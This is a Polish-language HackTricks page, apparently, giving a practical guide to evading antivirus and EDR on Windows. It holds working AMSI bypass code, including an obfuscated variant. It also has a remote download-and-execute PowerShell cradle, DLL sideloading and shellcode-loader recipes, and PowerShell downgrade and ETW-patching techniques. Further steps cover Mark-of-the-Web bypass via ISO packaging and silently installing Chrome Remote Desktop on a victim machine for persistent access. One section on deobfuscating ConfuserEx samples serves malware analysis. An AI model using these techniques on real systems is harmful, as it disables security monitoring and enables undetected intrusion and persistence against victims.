# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**This page was written by** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Wyłączanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania Windows Defendera.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania Windows Defendera podszywając się pod inny AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Metodologia omijania AV**

Obecnie AV używają różnych metod do sprawdzania, czy plik jest złośliwy, czy nie: wykrywanie statyczne, analiza dynamiczna, a w przypadku bardziej zaawansowanych EDR — analiza behawioralna.

### **Wykrywanie statyczne**

Wykrywanie statyczne polega na oznaczaniu znanych złośliwych stringów lub sekwencji bajtów w binarium lub skrypcie, oraz na wyciąganiu informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że korzystanie z publicznie znanych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już zanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia takiego wykrywania:

- **Encryption**

Jeśli zaszyfrujesz binarium, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebować jakiegoś loadera do odszyfrowania i uruchomienia programu w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić kilka stringów w binarium lub skrypcie, aby przejść obok AV, ale może to być czasochłonne w zależności od tego, co próbujesz zaciemnić.

- **Custom tooling**

Jeśli opracujesz własne narzędzia, nie będzie znanych sygnatur malicious, ale to zabiera dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem na sprawdzenie wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów i każdorazowo prosi Defendera o przeskanowanie każdego z nich, dzięki czemu może dokładnie wskazać, które stringi lub bajty w twoim binarium są oznaczone.

Gorąco polecam obejrzeć tę [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym omijaniu AV.

### **Analiza dynamiczna**

Analiza dynamiczna to moment, gdy AV uruchamia twoje binarium w sandboxie i obserwuje złośliwą aktywność (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonanie minidumpu na LSASS itp.). Ta część może być trudniejsza do obejścia, ale oto kilka rzeczy, które możesz zrobić, aby ominąć sandboksy.

- **Sleep before execution** W zależności od implementacji, może to być świetny sposób na ominięcie analizy dynamicznej AV. AV mają bardzo krótki czas na skanowanie plików, aby nie przerywać pracy użytkownika, więc używanie długich sleepów może zaburzyć analizę binariów. Problem w tym, że wiele sandboxów AV może pominąć sleep w zależności od implementacji.
- **Checking machine's resources** Zazwyczaj sandboksy mają bardzo mało zasobów do wykorzystania (np. < 2GB RAM), inaczej mogłyby spowolnić maszynę użytkownika. Możesz też wykazać się kreatywnością, np. sprawdzając temperaturę CPU czy prędkości wentylatorów — nie wszystko będzie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz targetować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera i porównać z oczekiwaną; jeśli nie pasuje, program może się zakończyć.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa pasuje do HAL9TH, oznacza to, że jesteś w sandboxie Defendera i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>źródło: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) przeciwko sandboxom

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej w tym wpisie, **public tools** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz użyć mimikatz**? Albo czy mógłbyś użyć innego projektu, który jest mniej znany i także zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie ta druga. Biorąc mimikatz jako przykład, jest to prawdopodobnie jedno z, jeśli nie najbardziej wykrywalne narzędzie przez AV i EDR; sam projekt jest super fajny, ale jest też koszmarem przy próbach obejścia AV, więc po prostu poszukaj alternatyw do tego, co próbujesz osiągnąć.

> [!TIP]
> Modyfikując swoje payloady pod kątem evasion, upewnij się, że **wyłączyłeś automatyczne przesyłanie próbek** w defenderze, i proszę, serio, **NIE PRZESYŁAJ NA VIRUSTOTAL**, jeśli twoim celem jest długoterminowe osiągnięcie evasion. Jeśli chcesz sprawdzić, czy twój payload zostanie wykryty przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z rezultatu.

## EXEs vs DLLs

Kiedy tylko to możliwe, zawsze **priorytetowo używaj DLLi dla evasion** — z mojego doświadczenia pliki DLL są zwykle **znacznie mniej wykrywane** i analizowane, więc to bardzo prosty trik pozwalający uniknąć wykrycia w niektórych przypadkach (o ile twój payload ma sposób uruchomienia jako DLL).

Jak widać na tym obrazku, DLL Payload z Havoc ma współczynnik wykrycia 4/26 na antiscan.me, podczas gdy EXE payload ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me porównanie normalnego Havoc EXE payload vs normalnego Havoc DLL</p></figcaption></figure>

Poniżej pokażemy kilka sztuczek, których możesz użyć z plikami DLL, aby być dużo bardziej stealthowym.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL przez loader poprzez umieszczenie zarówno aplikacji ofiary, jak i złośliwych payloadów obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) oraz następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wypisze listę programów podatnych na DLL hijacking znajdujących się w "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Gorąco polecam, żebyś **explore DLL Hijackable/Sideloadable programs yourself** — ta technika jest dość stealthy przy prawidłowym wykonaniu, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz zostać łatwo złapany.

Samo umieszczenie malicious DLL o nazwie, którą program oczekuje załadować, nie uruchomi twojego payloadu, ponieważ program oczekuje konkretnych funkcji w tym DLL. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania, które program wykonuje z proxy (and malicious) DLL do oryginalnego DLL, zachowując tym samym funkcjonalność programu i umożliwiając obsługę wykonania twojego payloadu.

Będę używać projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie utworzy 2 pliki: szablon kodu źródłowego DLL oraz oryginalny, przemianowany plik DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Oto wyniki:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany za pomocą [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają wskaźnik wykrywania 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Gorąco polecam obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omówiliśmy, w bardziej szczegółowy sposób.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób stealthy.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Unikanie wykrycia to gra w kotka i myszkę — to, co działa dziś, może być wykryte jutro, więc nigdy nie polegaj wyłącznie na jednym narzędziu; jeśli to możliwe, staraj się łączyć kilka technik omijania.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

Funkcja AMSI jest zintegrowana z następującymi komponentami Windows:

- User Account Control, or UAC (podnoszenie uprawnień EXE, COM, MSI lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Pozwala rozwiązaniom antywirusowym na analizę zachowania skryptów przez udostępnienie zawartości skryptu w formie, która jest zarówno niezaszyfrowana, jak i nieobfuskowana.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` a następnie ścieżkę do pliku wykonywalnego, z którego skrypt został uruchomiony, w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy złapani in-memory z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# jest również przetwarzany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` używanego do ładowania i wykonywania w pamięci. Dlatego zaleca się używanie niższych wersji .NET (np. 4.7.2 lub starszych) do wykonywania in-memory, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów obejścia AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie w oparciu o wykrywania statyczne, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI ma zdolność do unobfuscating skryptów nawet jeśli mają wiele warstw, więc obfuscation może być złą opcją w zależności od sposobu jej wykonania. To sprawia, że uniknięcie wykrycia nie jest takie proste. Czasami jednak wystarczy zmienić kilka nazw zmiennych i wszystko będzie w porządku — zależy to od stopnia, w jakim coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane przez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itd.), możliwe jest łatwe manipulowanie nim nawet podczas działania jako nieuprzywilejowany użytkownik. Z powodu tej wady w implementacji AMSI, badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie przeprowadzone żadne skanowanie. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation) i Microsoft opracował sygnaturę, aby zapobiec szerszemu wykorzystaniu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc aby użyć tej techniki potrzebna jest pewna modyfikacja.

Oto zmodyfikowany AMSI bypass, który zaczerpnąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie wykryte po publikacji tego wpisu, więc nie powinieneś publikować żadnego kodu, jeśli planujesz pozostać niezauważony.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) po bardziej szczegółowe wyjaśnienie.

Istnieje też wiele innych technik służących do omijania AMSI za pomocą PowerShell — sprawdź [**tę stronę**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**to repozytorium**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się więcej o nich.

To narzędzie [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) także generuje skrypt do obejścia AMSI.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** lub **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie to działa poprzez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowany, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## Rejestrowanie PowerShell

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących, którzy chcą uniknąć wykrycia**.

Aby obejść rejestrowanie PowerShell, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: Możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) w tym celu.
- **Use Powershell version 2**: Jeśli użyjesz PowerShell version 2, AMSI nie zostanie załadowany, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić powershell bez obron (to właśnie wykorzystuje `powerpick` z Cobal Strike).


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię binarki i ułatwia AVs i EDRs jej wykrycie. Uważaj na to i rozważ zastosowanie szyfrowania tylko w konkretnych fragmentach kodu, które są wrażliwe lub które chcesz ukryć.

### Deobfuskacja binariów .NET chronionych przez ConfuserEx

Podczas analizowania malware używającego ConfuserEx 2 (lub komercyjnych forków) często napotyka się kilka warstw ochrony, które blokują dekompilery i sandboksy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który można następnie zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Usuwanie anti-tamper – ConfuserEx szyfruje każde ciało metody i odszyfrowuje je wewnątrz statycznego konstruktora modułu (`<Module>.cctor`). To także modyfikuje sumę kontrolną PE, więc każda modyfikacja może spowodować awarię binarki. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać klucze XOR i przepisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`), które mogą być przydatne przy pisaniu własnego unpackera.

2.  Odzyskiwanie symboli / control-flow – podaj *czysty* plik do **de4dot-cex** (fork de4dot świadomy ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – wybiera profil ConfuserEx 2
• de4dot cofa control-flow flattening, przywraca oryginalne namespaces, klasy i nazwy zmiennych oraz odszyfrowuje stałe stringi.

3.  Usuwanie proxy-call – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby jeszcze bardziej utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne .NET API takie jak `Convert.FromBase64String` lub `AES.Create()` zamiast nieczytelnych funkcji wrapper (`Class8.smethod_10`, …).

4.  Ręczne porządki – uruchom wynikowy binarny w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako TLV-encoded tablicę bajtów zainicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy łańcuch przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwego próbki – przydatne przy pracy na stacji offline.

> 🛈  ConfuserEx generuje atrybut niestandardowy o nazwie `ConfusedByAttribute`, który można użyć jako IOC do automatycznej triage próbek.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie open-source fork dla [LLVM](http://www.llvm.org/) compilation suite, który zapewnia zwiększone bezpieczeństwo oprogramowania przez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) oraz tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania w czasie kompilacji obfuskowanego kodu bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuskowanych operacji generowanych przez framework metaprogramowania szablonowego C++, co utrudnia analizę aplikacji osobie chcącej ją złamać.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków wspieranych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie kodu asemblerowego, przekształcając zwykłe instrukcje w ROP chains, utrudniając naturalne postrzeganie normalnego przebiegu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekonwertować istniejące EXE/DLL do shellcode, a następnie je załadować

## SmartScreen & MoTW

Możliwe, że widziałeś ten ekran podczas pobierania pewnych plików wykonywalnych z internetu i ich uruchamiania.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający na celu ochronę końcowego użytkownika przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie w oparciu o reputację, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, ostrzegając i uniemożliwiając użytkownikowi wykonanie pliku (choć plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony po pobraniu plików z internetu, wraz z URL-em, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Warto zaznaczyć, że pliki wykonywalne podpisane za pomocą **zaufanego** certyfikatu podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem zapobiegania otrzymaniu przez payloads Mark of The Web jest spakowanie ich wewnątrz jakiegoś kontenera, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloads do kontenerów wyjściowych, aby obejść Mark-of-the-Web.

Przykładowe użycie:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym **logować zdarzenia**. Jednak może być też wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwych działań.

Podobnie jak w przypadku wyłączania (bypassowania) AMSI, możliwe jest także sprawienie, by funkcja użytkowego procesu **`EtwEventWrite`** zwracała natychmiast bez logowania jakichkolwiek zdarzeń. Osiąga się to przez załatanie funkcji w pamięci tak, by od razu zwracała, skutecznie wyłączając logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dawna i nadal jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysku, jedyną rzeczą, o którą będziemy musieli się martwić, jest patchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, itd.) już zapewnia możliwość wykonywania assembly C# bezpośrednio w pamięci, ale istnieją różne sposoby robienia tego:

- **Fork\&Run**

Polega na **uruchomieniu nowego procesu-sakrificate**, wstrzyknięciu do tego procesu twojego złośliwego kodu post-exploitation, wykonaniu go, a po zakończeniu zabiciu tego procesu. Ma to zarówno zalety, jak i wady. Zaletą metody fork and run jest to, że wykonanie zachodzi **poza** naszym procesem Beacon implant. Oznacza to, że jeśli coś pójdzie nie tak w trakcie działania naszego kodu post-exploitation lub zostanie wykryte, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest to, że mamy **większe ryzyko** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **do własnego procesu**. W ten sposób można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonywania payloadu, istnieje **znacznie większe ryzyko** **utracenia Beacona**, ponieważ proces może się zrestartować lub zawiesić.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Jeśli chcesz przeczytać więcej o ładowaniu Assembly C#, sprawdź ten artykuł [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) oraz ich InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Możesz też ładować C# Assemblies **z poziomu PowerShell**, zobacz Invoke-SharpLoader ([https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)) oraz film S3cur3th1sSh1t ([https://www.youtube.com/watch?v=oe11Q-3Akuk](https://www.youtube.com/watch?v=oe11Q-3Akuk)).

## Using Other Programming Languages

Jak zaproponowano w [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), możliwe jest wykonywanie złośliwego kodu przy użyciu innych języków, udostępniając skompromitowanej maszynie dostęp **do środowiska interpretera zainstalowanego na Attacker Controlled SMB share**.

Pozwalając na dostęp do Interpreter Binaries i środowiska na SMB share możesz **wykonywać dowolny kod w tych językach w pamięci** skompromitowanej maszyny.

Repo wskazuje: Defender nadal skanuje skrypty, ale wykorzystując Go, Java, PHP itp. mamy **więcej elastyczności w ominięciu sygnatur statycznych**. Testy z losowymi nieobfuskowanymi skryptami reverse shell w tych językach okazały się skuteczne.

## TokenStomping

Token stomping to technika, która pozwala atakującemu **manipulować access token lub security product jak EDR czy AV**, umożliwiając redukcję jego uprawnień tak, że proces nie umrze, ale nie będzie miał uprawnień do sprawdzania złośliwych aktywności.

Aby temu zapobiec, Windows mógłby **uniemożliwić zewnętrznym procesom** uzyskiwanie uchwytów do tokenów procesów zabezpieczeń.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Jak opisano w [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), łatwo jest po prostu wdrożyć Chrome Remote Desktop na komputerze ofiary, a następnie użyć go do przejęcia i utrzymania dostępu:
1. Pobierz ze strony https://remotedesktop.google.com/, kliknij "Set up via SSH", a następnie kliknij plik MSI dla Windows, aby pobrać plik MSI.
2. Uruchom instalator cicho na maszynie ofiary (wymagane uprawnienia admina): `msiexec /i chromeremotedesktophost.msi /qn`
3. Wróć do strony Chrome Remote Desktop i kliknij dalej. Kreator poprosi Cię o autoryzację; kliknij przycisk Authorize, aby kontynuować.
4. Wykonaj podany parametr z pewnymi modyfikacjami: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Zwróć uwagę na parametr pin, który pozwala ustawić PIN bez użycia GUI).


## Advanced Evasion

Evasion to bardzo skomplikowany temat, czasem trzeba wziąć pod uwagę wiele różnych źródeł telemetrii w jednym systemie, więc praktycznie niemożliwe jest pozostanie całkowicie niewykrytym w dojrzałych środowiskach.

Każde środowisko, z którym się zetkniesz, będzie miało swoje mocne i słabe strony.

Gorąco zachęcam do obejrzenia tego wystąpienia od [@ATTL4S](https://twitter.com/DaniLJ94), aby zdobyć punkt wyjścia do bardziej zaawansowanych technik Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

To jest również świetne wystąpienie od [@mariuszbit](https://twitter.com/mariuszbit) o Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

